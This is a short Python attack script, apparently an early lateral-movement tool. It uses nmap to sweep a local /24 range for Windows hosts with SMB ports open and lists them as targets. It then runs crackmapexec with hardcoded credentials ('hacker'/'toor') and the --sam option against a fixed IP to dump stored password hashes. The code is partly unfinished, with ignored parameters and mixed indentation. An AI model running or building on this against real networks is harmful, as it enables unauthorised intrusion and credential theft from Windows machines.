import nmap
import re
import sys
import subprocess
import shlex

def convertIpToRange(ip):
	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
	return rgx.match(ip).group() + '0-255'

def nmScan(ip):
    targets = []
    range = convertIpToRange(ip)
    nm = nmap.PortScanner()
    nm.scan(hosts=range, arguments="-O -n -p445,139")
    hosts = nm.all_hosts()
	# For each running machine IP picked up by nmap
    for host in hosts:
		# If they have OS information
    	if 'osmatch' in nm[host]:
            host_obj = {'ip': host, 'osfamily': "", 'osgen': []}
			# Look through all possible OS matches
            for os in nm[host]['osmatch']:
                for c in os['osclass']:
					# If the OS family is Windows add the machine to possible targets
                    if c['osfamily'] == "Windows":
                        if len(host_obj['osfamily']) == 0:
                            host_obj['osfamily'] = c['osfamily']
                        host_obj['osgen'].append(c['osgen'])
            if host_obj['osfamily'] == "Windows":
                targets.append(host_obj)
    return targets

def firstMachine(username, password, ip):
    args = shlex.split('/usr/bin/crackmapexec -u hacker -p toor -d WORKGROUP 169.254.121.23 --sam')
    proc = subprocess.Popen(args, stdout=subprocess.PIPE)
    tmp = proc.stdout.read()
    print(tmp)

def main():
    ip = sys.argv[1]
    print(convertIpToRange(ip))
    firstMachine('hacker', 'toor', '169.254.121.23')
	#target_hosts = nmScan(ip)

if __name__ == "__main__":
    # execute only if run as a script
    main()

